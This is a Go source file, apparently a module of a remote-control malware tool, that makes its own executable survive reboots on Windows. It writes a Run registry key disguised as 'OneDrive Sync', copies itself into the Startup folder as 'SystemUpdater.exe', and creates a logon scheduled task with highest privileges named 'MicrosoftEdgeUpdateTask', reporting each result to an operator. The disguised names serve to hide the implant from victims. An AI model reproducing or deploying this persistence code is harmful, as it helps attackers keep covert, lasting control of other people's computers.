package handlers

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"golang.org/x/sys/windows" 
	"golang.org/x/sys/windows/registry"
)

func EnsurePersistence() string {
	exePath, err := os.Executable()
	if err != nil {
		return "❌ Could not obtain executable path."
	}
	var results []string
	results = append(results, addToRegistry(exePath))
	results = append(results, copyToStartup(exePath)) 
	results = append(results, createScheduledTask(exePath))
	return "--- ⚙️ PERSISTENCE RESULTS ⚙️ ---\n" + strings.Join(results, "\n")
}

func addToRegistry(exePath string) string {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Sprintf("❌ Registry: %v", err)
	}
	defer key.Close()
	err = key.SetStringValue("OneDrive Sync", exePath) 
	if err != nil {
		return fmt.Sprintf("❌ Registry (SetValue): %v", err)
	}
	return "✅ Registry Persistence: OK"
}

func copyToStartup(exePath string) string {

	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return fmt.Sprintf("❌ Startup (WinAPI): Could not obtain startup path: %v", err)
	}
	destPath := filepath.Join(startupDir, "SystemUpdater.exe") 
	
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Sprintf("❌ Startup (Open): %v", err)
	}
	defer srcFile.Close()
	
	destFile, err := os.Create(destPath)
	if err != nil {
		return fmt.Sprintf("❌ Startup (Create): %v", err)
	}
	defer destFile.Close()
	
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return fmt.Sprintf("❌ Startup (Copy): %v", err)
	}
	return "✅ Startup Folder Persistence (via WinAPI): OK"
}

func createScheduledTask(exePath string) string {
	taskName := "MicrosoftEdgeUpdateTask"
	cmd := exec.Command("schtasks", "/Create", "/TN", taskName, "/TR", fmt.Sprintf(`"%s"`, exePath), "/SC", "ONLOGON", "/RL", "HIGHEST", "/F")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("❌ Scheduled Task: %v\n%s", err, string(output))
	}
	return "✅ Scheduled Task Persistence: OK"
}